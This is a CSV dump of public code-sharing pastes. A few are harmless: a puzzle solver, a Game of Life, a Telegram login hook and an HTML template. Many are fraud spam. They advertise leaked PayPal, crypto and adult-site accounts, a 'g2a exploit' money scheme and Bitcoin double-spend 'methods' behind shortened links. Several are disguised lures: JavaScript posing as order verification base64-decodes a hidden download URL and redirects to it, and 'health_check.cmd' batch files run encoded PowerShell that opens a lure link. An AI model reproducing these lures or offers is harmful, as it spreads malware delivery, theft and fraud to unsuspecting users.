id,title,username,language,date,content
J19vru35,Scam Casinos and Stores,WantingTrae,JavaScript,Monday 5th of May 2025 06:57:17 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 06238
cM6V97cG,Order.js,zebmekey,JavaScript,Monday 5th of May 2025 06:56:54 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/23696/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
M2zV3tL4,Chaturbate with Tokens,SpawnKz,JavaScript,Monday 5th of May 2025 06:56:41 PM CDT,99567 Accounts Posted On https://t.me/leakzbyeminem
DKWnxD2h,Jammyx Code 2.0,spacialfries,HTML,Monday 5th of May 2025 06:56:27 PM CDT,"<!--

Replace the following hexcodes for rarity.
Hexcodes are ordered from darkest to lightest - text, cell border, main body.

Standard: #34608A | #9BB7BE | #D4DFE0
Unusual: #1C8389 | #9ACEBE | #DCF1E8
Rare: #931A17 | #BC8296 | #D2BAC4
Extraordinary: #9F25AD | #C39DDF | #E2D6F0
Crossbreed: #D45737 | #FFB672 | #FFE8A1

-->

<!-- Main Tab -->

<div class=""accordion container card card-block border09 p-4 col-xs-12 col-xl-6"" style=""background:#9BB7BE; border-radius:75px; font-weight:bold;"" id=""ACCORDION"">
     
     <!-- Background Particles -->
     <i class=""fas fa-virus fa-xl"" style=""color:#34608A; position:absolute; left:10px; top:60%; opacity:0.25;""></i>
     <i class=""fas fa-virus fa-xl"" style=""color:#34608A; position:absolute; right:10px; bottom:60%; opacity:0.25;""></i>
     <i class=""fas fa-viruses fa-xl"" style=""color:#34608A; position:absolute; left:25%; top:20px; opacity:0.25;""></i>
     <i class=""fas fa-viruses fa-xl"" style=""color:#34608A; position:absolute; right:25%; bottom:20px; opacity:0.25;""></i>
     <i class=""fas fa-virus fa-xl"" style=""color:#34608A; position:absolute; left:60%; top:20px; opacity:0.25;""></i>
     <i class=""fas fa-virus fa-xl"" style=""color:#34608A; position:absolute; right:60%; bottom:20px; opacity:0.25;""></i>
     
     <div class=""row text-center justify-content-center mb-4"">
          
         <a class=""col-auto p-2 mx-2"" style=""background:#34608A; color:#9BB7BE; z-index:1; width:3em; border-radius:100px;"" data-toggle=""collapse"" href=""#MainTab""><i class=""fas fa-star fa-xl""></i></a>
         <a class=""col-auto p-2 mx-2"" style=""background:#34608A; color:#9BB7BE; z-index:1; width:3em; border-radius:100px;"" data-toggle=""collapse"" href=""#AboutTab""><i class=""fas fa-list-ul fa-xl""></i></a>
         <a class=""col-auto p-2 mx-2"" style=""background:#34608A; color:#9BB7BE; z-index:1; width:3em; border-radius:100px;"" data-toggle=""collapse"" href=""#RelationsTab""><i class=""fas fa-heart fa-xl""></i></a>
         <a class=""col-auto p-2 mx-2"" style=""background:#34608A; color:#9BB7BE; z-index:1; width:3em; border-radius:100px;"" data-toggle=""collapse"" href=""#TraitsTab""><i class=""fas fa-plus-minus fa-xl""></i></a>
         <a class=""col-auto p-2 mx-2"" style=""background:#34608A; color:#9BB7BE; z-index:1; width:3em; border-radius:100px;"" href=""https://toyhou.se/32852487.jammyx-profile-code/32966574.tabbed-expanded""><i class=""fas fa-code fa-xl""></i></a>
         
     </div>
     
     <div class=""container card card-block border-0"" style=""background:#D4DFE0; color:#34608A; border-radius:50px;"">
         
         <div class=""collapse show"" data-parent=""#ACCORDION"" id=""MainTab"">
             <p class=""mx-4 mb-0"">
                 <span class=""h1"" style=""float:left; font-family:Tahoma, sans-serif; font-weight:bold; text-shadow: 3px 2px 5px #9BB7BE;"">
                     <i class=""fas fa-splotch""></i> Name -
                     <a href=""JAMMYX PROFILE LINK HERE"" style=""color:#34608A; opacity:0.5"">#000<small> <i class=""fas fa-link fa-xs""></i></small></a>
                 </span>
                 <span style=""float:right; font-style:italic; text-shadow:0px 2px 2px #9BB7BE;"">
                     pronouns • trait
                 </span>
             </p>
             <!-- Divider --><hr class=""mt-0"" style=""border-top:5px dotted #9BB7BE; width:100%;"">
             
             <div class=""row"">
                 
                 <div class=""container col-sm-12 col-xl-auto text-center"">
                     <img src=""https://jammyx.net/images/data/items/T897CoO4uo1-image.png"" style=""border-radius:25px; background:#9BB7BE; max-width:200px;"">
                 </div>
                 
                 <!-- Column Divider --><div style=""width:0px; border-right:5px dotted #9BB7BE;"" class=""d-none d-sm-block""></div>
                 
                 <div class=""container col-sm-12 col-xl"">
                     <h4 style=""display:flex; justify-content:center; font-style:italic;""> more • traits • can • go • here</h4>
                     <p style=""max-height:173px; overflow:auto;"">
                         <!-- Short Character Intro -->
                         Text longer than 200 pixels will add a scrollbar. Try to keep this part shorter - for longer, more detailed content, use the ""About"" section instead. <span style=""color:#9BB7BE"">This text is here to help you visualize how many lines of text takes up 200 pixels.<br><br>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis sollicitudin elit sed tellus blandit viverra sed eget odio. Donec accumsan tempor lacus, et venenatis elit feugiat non. Duis porta eros et velit blandit dapibus. Curabitur ac finibus eros.</span>
                     </p>
                 </div>
                 
             </div>
         </div>
         
         <div class=""collapse"" data-parent=""#ACCORDION"" id=""AboutTab"">
             
             <div class=""row"">
                 
                 <div class=""container col-sm-12 col-xl-auto"">
                     <h3 class=""text-center"" style=""font-family:Tahoma, sans-serif; font-weight:bold; text-shadow: 3px 2px 5px #9BB7BE;"">Traits</h3>
                     <!-- To avoid cut-off text, this column will get wider to fit the name of the traits inside it, and the other column will get tighter.-->
                     <hr class=""mt-0"" style=""border-top:5px dotted #9BB7BE; width:100%;"">
                     <ul class=""mb-0"" style=""list-style:none; padding-left:0px;"">
                         
                         <!-- Trait List -->
                         <li><big>x Rarity</big></li>
                         <li><big>x Subtype</big></li>
                         <li>[x] x Antennae</li>
                         <li>[x] x Core</li>
                         <li>[x] x Symbiont</li>
                         <li>[x] x Tail</li>
                         <li>[x] x Cytoplasm</li>
                         <li>[x] x Liquid*</li>
                         <li>[M] x Mutation</li>
                         <li>[M] x Mutation</li>
                         <li>[M] x Mutation</li>
                         
                     </ul>
                 </div>
                 
                 <!-- Column Divider --><div style=""width:0px; border-right:5px dotted #9BB7BE;""></div>
                 
                 <div class=""container col-sm-12 col-xl"">
                     <h3 class=""text-center"" style=""font-family:Tahoma, sans-serif; font-weight:bold; text-shadow: 3px 2px 5px #9BB7BE;"">About</h3>
                     <hr class=""mt-0"" style=""border-top:5px dotted #9BB7BE; width:100%;"">
                     <p style=""max-height:395px; overflow:auto;"">
                         
                         <!--More Detailed Info-->
                         The text here can be as long as you want! Anything longer than about 400 pixels will get a scroll bar. This box is better for detailed history, personality, etc. <span style=""color:#9BB7BE"">This text is here to help you visualize how the code will look with lots of text.<br><br>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Vivamus molestie tellus ac erat luctus ornare. Vestibulum congue enim eu tristique maximus. Duis odio risus, auctor ut erat ut, varius vestibulum sapien. Pellentesque blandit pretium ullamcorper. Aenean facilisis id erat eu vehicula. Aenean sed lobortis massa.<br><br>Orci varius natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Aliquam condimentum massa eget metus fringilla vulputate. Sed quis elit ut turpis pulvinar malesuada sit amet sed massa.  Suspendisse quis sem id erat hendrerit convallis porta sit amet dui.<br><br>Aliquam lobortis molestie urna, in cursus ligula sagittis sit amet. Quisque sed mauris vel risus cursus consequat. Fusce in gravida magna. Suspendisse dapibus, ex eu tristique cursus, risus nulla gravida leo, eget maximus justo urna quis ante. Quisque venenatis, nibh at eleifend ullamcorper, purus justo euismod justo, tristique lacinia erat felis sed enim. Praesent elementum metus est, tempor pretium augue finibus in.</span>
                         
                     </p>
                 </div>
                 
             </div>
         </div>
         
         <div class=""collapse"" data-parent=""#ACCORDION"" id=""RelationsTab"">
             <h1 class=""h1 text-center"" style=""font-family:Tahoma, sans-serif; font-weight:bold; text-shadow: 3px 2px 5px #9BB7BE;""><i class=""fas fa-heart""></i> Relationships <i class=""fas fa-heart-half-stroke""></i></h1>
             <hr class=""mt-0"" style=""border-top:5px dotted #9BB7BE; width:100%;"">
             
             <div class=""justify-content-center"">
                 <div class=""row mx-auto text-center"">
                     
                     <!--
                     Replace the ""fa-play"" in each relationship with your desired relationship icon.
                     
                     Partners: fa-heart
                     Friends: fa-handshake-simple
                     Family: fa-house
                     
                     -->
                     
                     <!-- Relationship A -->
                     <a href=""CHARACTER LINK"" style=""color:#34608A;""><div class=""col container p-0 m-1"">
                         <img src=""https://jammyx.net/images/data/items/T897CoO4uo1-image.png"" style=""border-radius:25px; background:#9BB7BE; max-width:100px;""><br>
                         <i class=""fas fa-play""></i> Name
                     </div></a>
                     
                     <!-- Relationship A -->
                     <a href=""CHARACTER LINK"" style=""color:#34608A;""><div class=""col container p-0 m-1"">
                         <img src=""https://jammyx.net/images/data/items/T897CoO4uo1-image.png"" style=""border-radius:25px; background:#9BB7BE; max-width:100px;""><br>
                         <i class=""fas fa-play""></i> Name
                     </div></a>
                     
                     <!-- Relationship A -->
                     <a href=""CHARACTER LINK"" style=""color:#34608A;""><div class=""col container p-0 m-1"">
                         <img src=""https://jammyx.net/images/data/items/T897CoO4uo1-image.png"" style=""border-radius:25px; background:#9BB7BE; max-width:100px;""><br>
                         <i class=""fas fa-play""></i> Name
                     </div></a>
                     
                     <!-- Relationship A -->
                     <a href=""CHARACTER LINK"" style=""color:#34608A;""><div class=""col container p-0 m-1"">
                         <img src=""https://jammyx.net/images/data/items/T897CoO4uo1-image.png"" style=""border-radius:25px; background:#9BB7BE; max-width:100px;""><br>
                         <i class=""fas fa-play""></i> Name
                     </div></a>
                     
                     <!-- Relationship A -->
                     <a href=""CHARACTER LINK"" style=""color:#34608A;""><div class=""col container p-0 m-1"">
                         <img src=""https://jammyx.net/images/data/items/T897CoO4uo1-image.png"" style=""border-radius:25px; background:#9BB7BE; max-width:100px;""><br>
                         <i class=""fas fa-play""></i> Name
                     </div></a>
                     
                     <!-- Relationship A -->
                     <a href=""CHARACTER LINK"" style=""color:#34608A;""><div class=""col container p-0 m-1"">
                         <img src=""https://jammyx.net/images/data/items/T897CoO4uo1-image.png"" style=""border-radius:25px; background:#9BB7BE; max-width:100px;""><br>
                         <i class=""fas fa-play""></i> Name
                     </div></a>
                     
                     <!-- Relationship A -->
                     <a href=""CHARACTER LINK"" style=""color:#34608A;""><div class=""col container p-0 m-1"">
                         <img src=""https://jammyx.net/images/data/items/T897CoO4uo1-image.png"" style=""border-radius:25px; background:#9BB7BE; max-width:100px;""><br>
                         <i class=""fas fa-play""></i> Name
                     </div></a>
                     
                 </div>
             </div>
         </div>
         
         <div class=""collapse"" data-parent=""#ACCORDION"" id=""TraitsTab"">
             
             <div class=""row""><div class=""container col-sm-12 col-xl"">
                     <h3 class=""text-center"" style=""font-family:Tahoma, sans-serif; font-weight:bold; text-shadow: 3px 2px 5px #9BB7BE;"">Likes</h3>
                     <hr class=""mt-0"" style=""border-top:5px dotted #9BB7BE; width:100%;"">
                     <ul class=""text-center mb-0"" style=""list-style:none; padding-left:0px;"">
                         
                         <!-- Likes -->
                         <li>item</li>
                         <li>item</li>
                         <li>item</li>
                         <li>item</li>
                         <li>item</li>
                         
                     </ul>
                 </div>
                 
                 <!-- Column Divider --><div style=""width:0px; border-right:5px dotted #9BB7BE;""></div>
                 
                 <div class=""container col-sm-12 col-xl"">
                     <h3 class=""text-center"" style=""font-family:Tahoma, sans-serif; font-weight:bold; text-shadow: 3px 2px 5px #9BB7BE;"">Dislikes</h3>
                     <hr class=""mt-0"" style=""border-top:5px dotted #9BB7BE; width:100%;"">
                     <ul class=""text-center mb-0"" style=""list-style:none; padding-left:0px;"">
                         
                         <!-- Disikes -->
                         <li>item</li>
                         <li>item</li>
                         <li>item</li>
                         <li>item</li>
                         <li>item</li>
                         
                     </ul>
                 </div>
                 
             </div>
             
             <hr style=""border-top:5px dotted #9BB7BE; width:100%;"">
             <h3 class=""text-center"" style=""font-family:Tahoma, sans-serif; font-weight:bold; text-shadow: 3px 2px 5px #9BB7BE;"">Trivia</h3>
             
             <ul class=""mb-0"" style=""padding-left:2em"">
                         
                         <!-- Trivia -->
                         <li>
                             Fun fact here.
                         </li>
                         
                         <li>
                             Fun fact here.
                         </li>
                         
                         <li>
                             Fun fact here.
                         </li>
                         
                     </ul>
             
             
         </div>
         
     </div>
     
</div>"
5JABam84,Make $1000 15-MINUTES (BEGINNER) OV,noooob241,JavaScript,Monday 5th of May 2025 06:52:16 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

ufhKtuqRjs
"
zzG2PXgA,Sliding Puzzle (Chess 8),tepyotin2,C++,Monday 5th of May 2025 06:45:40 PM CDT,"#include <bits/stdc++.h>

using namespace std;

struct Move{
	string board;
	int count;
};

string s;
vector<int> directions[9];
//map<string, int> visited;
unordered_map<string, int> visited;
queue<Move> q;
string res = ""123804765"";

int main(){
	//freopen(""slidingpuzzle.in"", ""r"", stdin);
	
	cin >> s;
	directions[0].push_back(1);
	directions[0].push_back(3);
	directions[1].push_back(-1);
	directions[1].push_back(1);
	directions[1].push_back(3);
	directions[2].push_back(-1);
	directions[2].push_back(3);
	directions[3].push_back(-3);
	directions[3].push_back(1);
	directions[3].push_back(3);
	directions[4].push_back(-3);
	directions[4].push_back(-1);
	directions[4].push_back(1);
	directions[4].push_back(3);
	directions[5].push_back(-3);
	directions[5].push_back(-1);
	directions[5].push_back(3);
	directions[6].push_back(-3);
	directions[6].push_back(1);
	directions[7].push_back(-3);
	directions[7].push_back(-1);
	directions[7].push_back(1);
	directions[8].push_back(-3);
	directions[8].push_back(-1);
	visited[s]++;
	q.push({s, 0});
	while(!q.empty()){
		Move cur = q.front();
		q.pop();
		if(cur.board == res){
			cout << cur.count << '\n';
			return 0;
		}
		int it = cur.board.find('0');
		//cout << it << '\n';
		for(int v: directions[it]){
			string c = cur.board;
			swap(c[it+v], c[it]);
			//cout << c << '\n';
			if(visited[c] == 0){
				visited[c]++;
				q.push({c, cur.count+1});
			}
		}
	}
	cout << ""0"" << '\n';
	
	return 0;
}
"
jRirKYmC,EARN $900 INSTANTLY 2025⭐ DG,Luia,JavaScript,Monday 5th of May 2025 06:45:19 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

aCiJOoQncC
"
DWLx4FcN,b.08,Matiasdlsr,ASM (NASM),Monday 5th of May 2025 06:45:06 PM CDT,".data
    var: .word 123456
.text
 la x5,var
 lw a0,0(x5)
 li a7,1
 ecall
 li a7,10
 ecall"
A8d1aX1p,Doublespending using Vanity Wallet,WantingTrae,JavaScript,Monday 5th of May 2025 06:41:55 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 88975
SghdeQQu,Market.js,zebmekey,JavaScript,Monday 5th of May 2025 06:41:32 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/19123/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ma0e1GXg,Crypto Accounts,SpawnKz,JavaScript,Monday 5th of May 2025 06:41:20 PM CDT,05605 Accounts Posted On https://t.me/leakzbyeminem
tE7UNeqS,Make $1000 15-MINUTES  (BEGINNER) 6D,Luia,JavaScript,Monday 5th of May 2025 06:38:35 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

TO7uusX1dz
"
U5p9pPuu,Make $1000 15-MINUTES (BEGINNER) OV,hello12574,JavaScript,Monday 5th of May 2025 06:31:40 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

gBGV1XW5h0
"
9Ags2ks0,e,yeeeeeeeeeeeee,Lua,Monday 5th of May 2025 06:28:04 PM CDT,"-- Attach to monitor on the right
local monitor = peripheral.wrap(""right"")
if not monitor then
    error(""Monitor not found on the right side."")
end

-- Setup monitor
monitor.setTextScale(0.5) -- Smaller text = more space
term.redirect(monitor)
monitor.clear()

-- Configuration
local width, height = monitor.getSize()
local delay = 0.2
local alive = ""O""
local dead = "" ""

-- Create grid
local function createGrid()
    local grid = {}
    for y = 1, height do
        grid[y] = {}
        for x = 1, width do
            grid[y][x] = math.random() < 0.2 and 1 or 0
        end
    end
    return grid
end

-- Count live neighbors
local function countNeighbors(grid, x, y)
    local count = 0
    for dy = -1, 1 do
        for dx = -1, 1 do
            if not (dx == 0 and dy == 0) then
                local nx, ny = x + dx, y + dy
                if nx >= 1 and nx <= width and ny >= 1 and ny <= height then
                    count = count + grid[ny][nx]
                end
            end
        end
    end
    return count
end

-- Update the grid
local function updateGrid(grid)
    local newGrid = {}
    for y = 1, height do
        newGrid[y] = {}
        for x = 1, width do
            local neighbors = countNeighbors(grid, x, y)
            local cell = grid[y][x]
            if cell == 1 then
                newGrid[y][x] = (neighbors == 2 or neighbors == 3) and 1 or 0
            else
                newGrid[y][x] = (neighbors == 3) and 1 or 0
            end
        end
    end
    return newGrid
end

-- Check if all cells are dead
local function isAllDead(grid)
    for y = 1, height do
        for x = 1, width do
            if grid[y][x] == 1 then
                return false
            end
        end
    end
    return true
end

-- Draw the grid
local function drawGrid(grid)
    monitor.setCursorPos(1,1)
    for y = 1, height do
        for x = 1, width do
            monitor.write(grid[y][x] == 1 and alive or dead)
        end
    end
end

-- Main loop
while true do
    local grid = createGrid()
    while true do
        drawGrid(grid)
        sleep(delay)
        grid = updateGrid(grid)
        if isAllDead(grid) then
            monitor.clear()
            monitor.setCursorPos(1, 1)
            monitor.write(""All cells died. Restarting..."")
            sleep(1)
            monitor.clear()
            break
        end
    end
end
"
xq3bc0qK,Abuse RBF in BTC transactions,WantingTrae,JavaScript,Monday 5th of May 2025 06:26:34 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 30430
6szKxXYt,Untitled,zebmekey,JavaScript,Monday 5th of May 2025 06:26:09 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/18249/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xhUbFa9T,PayPal with Balance,SpawnKz,JavaScript,Monday 5th of May 2025 06:25:58 PM CDT,12334 Accounts Posted On https://t.me/leakzbyeminem
4dqSMyzr,health_check.cmd,lucho2012,Batch,Monday 5th of May 2025 06:25:46 PM CDT,"@ECHO OFF
TITLE $~fazoddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==hfleak GOTO openHf

:openHf
ECHO Launching PowerShell command...
)powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0AMQAxAGIAMwA1AGMAMwAzAA==
EXIT /b
"
S96C57FK,EARN $900 INSTANTLY 2025⭐ DG,hello12574,JavaScript,Monday 5th of May 2025 06:24:52 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

9yskuTuu1d
"
TjzuY2iH,Untitled,Wonkiest29,JavaScript,Monday 5th of May 2025 06:19:14 PM CDT,"""use client""
// import { useEffect, useState } from ""react"";
import { useEffect, useState } from ""react"";
import { useSignal, initData, type User } from '@telegram-apps/sdk-react';

export function useTelegram() {
  // Use the SDK's signals to access Telegram data
  const initDataRaw = useSignal(initData.raw);
  const initDataState = useSignal(initData.state);
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [tg, setTg] = useState<any>(null);
  const [isBrowser, setIsBrowser] = useState(false);

  const user = initDataState?.user;

  useEffect(() => {
    // This effect runs only on the client side
    setIsBrowser(typeof window !== 'undefined');
    if (typeof window !== 'undefined') {
      setTg(window.Telegram?.WebApp);
      console.log('Telegram.WebApp:', window.Telegram?.WebApp);
      console.log('InitData:', initDataRaw, initDataState);
      console.log(""🔄 useTelegram init:"", { 
        initDataRaw: !!initDataRaw, 
        user: !!user,
        tg: !!window.Telegram?.WebApp
      });
    }
  }, []);

  useEffect(() => {
    if (!isBrowser) return;
    
    // Debug logging when dependencies change
    console.log(""🔍 useTelegram effect triggered:"", { 
      initDataRaw: !!initDataRaw, 
      user: !!user && user.id
    });
    
    // Check if Telegram data is available
    if (initDataRaw && initDataState?.user) {
      console.log(""✅ Telegram data available, starting authentication"");
      authenticateTelegramUser();
    } else if (initDataRaw === null) {
      // API loaded but we're not in Telegram
      console.log(""❌ Page opened outside Telegram Mini App"");
      setIsLoading(false);
    } else {
      console.log(""⏳ Waiting for Telegram API to load..."");
    }
  }, [initDataRaw, initDataState, isBrowser]);

  async function authenticateTelegramUser() {
    try {
      if (!initDataRaw || !initDataState?.user) {
        console.log(""❌ Cannot authenticate: missing data"");
        setIsLoading(false);
        return;
      }

      console.log(""🔐 Starting Telegram user authentication..."");
      console.log(""📊 User data:"", {
        id: initDataState.user.id,
        firstName: initDataState.user.firstName,
        username: initDataState.user.username
      });
      console.log(""🔗 API URL:"", `${process.env.NEXT_PUBLIC_API_URL}/api/auth/telegram`);
      
      const response = await fetch(`${process.env.NEXT_PUBLIC_API_URL}/api/auth/telegram`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ 
          initData: initDataRaw,
          user: {
            id: initDataState.user.id,
            first_name: initDataState.user.firstName,
            last_name: initDataState.user.lastName,
            username: initDataState.user.username,
            language_code: initDataState.user.languageCode,
            is_premium: initDataState.user.isPremium
          }
        })
      });
      
      console.log(""📡 Response status:"", response.status);
      
      if (!response.ok) {
        const errorData = await response.json();
        console.error(""❌ Server error:"", errorData);
        throw new Error(errorData.message || 'Authentication failed');
      }
      
      const data = await response.json();
      console.log(""✅ Auth response:"", { success: data.success, hasJwt: !!data.jwt });
      
      // Save token to localStorage and cookie (client-side only)
      if (isBrowser) {
        localStorage.setItem(""authToken"", data.jwt);
        const expiryDate = new Date(Date.now() + 24 * 60 * 60 * 1000);
        document.cookie = `authToken=${data.jwt}; expires=${expiryDate.toUTCString()}; path=/; SameSite=Strict`;
      }
      
      console.log(""🎉 Telegram authentication successful!"");
      setIsLoading(false);
    } catch (err) {
      console.error(""❌ Error during Telegram user authentication:"", err);
      setError(err instanceof Error ? err.message : ""Authentication failed"");
      setIsLoading(false);
    }
  }

  return { 
    tg, 
    user, 
    initData: initDataState,
    initDataRaw,
    isLoading, 
    error 
  };
}"
Apfc2DkC,Untitled,Wonkiest29,JavaScript,Monday 5th of May 2025 06:17:14 PM CDT,"import { Markup } from ""telegraf"";
import logger from ""@root/logger.js"";

export const appCommand = (bot) => {
  bot.command(""app"", async (ctx) => {
    try {
      const WEB_APP_URL = ""https://url/"";
      
      await ctx.reply(
        ""Откройте мини-приложение поддержки:"",
        Markup.inlineKeyboard([
          Markup.button.webApp(""Открыть поддержку"", WEB_APP_URL)
        ])
      );
      
    } catch (error) {
      logger.error(""Ошибка в команде app:"", error);
      await ctx.reply(
        ""Произошла ошибка при обработке команды. Пожалуйста, попробуйте позже.""
      );
    }
  });
};"
WB5saE8e,Leaked Accounts - Fresh HitUntitled,leighton,JavaScript,Monday 5th of May 2025 06:17:06 PM CDT,600904 - check it out at www.tinyurl.com/new2025may
wcNCJaqA,health_check.cmd,lucho2012,Batch,Monday 5th of May 2025 06:14:41 PM CDT,"@ECHO OFF
TITLE $~fazoddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==hfleak GOTO openHf

:openHf
ECHO Launching PowerShell command...
)powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0AYgAyAGYANABkAGQAMAAwAA==
EXIT /b
"
eG4tq009,Stake Free Balance Method,WantingTrae,JavaScript,Monday 5th of May 2025 06:11:10 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 54897
